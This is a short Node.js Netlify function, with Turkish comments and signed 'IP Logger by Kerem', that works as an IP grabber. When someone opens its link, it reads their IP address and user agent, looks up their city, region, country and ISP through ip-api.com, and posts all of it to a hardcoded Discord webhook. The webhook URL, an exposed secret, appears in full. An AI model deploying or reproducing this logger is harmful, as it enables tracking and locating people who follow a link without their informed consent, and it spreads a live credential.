const fetch = require('node-fetch');

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1404184373539897504/KibmdGh-3ZSzMg9cL1T0Mw2s7KppMSMMZvZ329Hr87GXdD-_QNBW7shKx_rlQBGSfE25';

// Basit User-Agent parser fonksiyonu
function parseUserAgent(ua) {
  let browser = "Bilinmiyor";
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  let os = "Bilinmiyor";
  if (ua.includes("Windows NT 10")) os = "Windows 10";
  else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
  else if (ua.includes("Mac OS X")) os = "Mac OS X";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone")) os = "iOS";

  return { browser, os };
}

exports.handler = async function(event) {
  try {
    // IP adresi al (Netlify + Cloudflare ortamı)
    // Öncelik: Netlify'ın gerçek istemci IP başlığı → Cloudflare başlığı → X-Forwarded-For
    const headers = event.headers || {};
    const ip =
      headers['x-nf-client-connection-ip'] ||
      headers['client-ip'] ||
      headers['cf-connecting-ip'] ||
      (headers['x-forwarded-for']?.split(',')[0].trim()) ||
      'Bilinmiyor';

    // Tarayıcı bilgisi
    const userAgent = event.headers['user-agent'] || 'Bilinmiyor';
    const { browser, os } = parseUserAgent(userAgent);

    // IP'den konum bilgisi çekiyoruz
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,timezone,isp`);
    const geoData = await geoResponse.json();

    // Discord embed mesaj yapısı
    const embed = {
      embeds: [
        {
          title: "Yeni Ziyaretçi Bilgisi",
          color: 3066993, // Yeşil renk
          fields: [
            { name: "IP Adresi", value: ip, inline: true },
            { name: "Konum", value: geoData.status === "success" ? `${geoData.city}, ${geoData.regionName}, ${geoData.country}` : "Bilinmiyor", inline: true },
            { name: "Zaman Dilimi", value: geoData.timezone || "Bilinmiyor", inline: true },
            { name: "İşletim Sistemi", value: os, inline: true },
            { name: "Tarayıcı", value: browser, inline: true },
            { name: "ISS", value: geoData.isp || "Bilinmiyor", inline: true },
            { name: "User-Agent", value: `\`\`\`${userAgent.substring(0, 100)}...\`\`\``, inline: false },
            { name: "Ziyaret Zamanı", value: new Date().toLocaleString(), inline: false }
          ],
          footer: {
            text: "IP Logger by Kerem",
            icon_url: "https://i.imgur.com/AfFp7pu.png"
          },
          timestamp: new Date().toISOString()
        }
      ]
    };

    // Discord webhook'a mesaj gönderiyoruz
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    // Kullanıcıya gösterilecek basit mesaj
    return {
      statusCode: 200,
      headers: { 'Content-Type': 'text/html' },
      body: `<h1>Selam! IP ve cihaz bilgin kaydedildi.</h1><p>IP: ${ip}</p><p>Tarayıcı: ${browser}</p><p>OS: ${os}</p>`
    };
  } catch (error) {
    console.error("Hata:", error);
    return {
      statusCode: 500,
      body: "Bir hata oluştu."
    };
  }
};
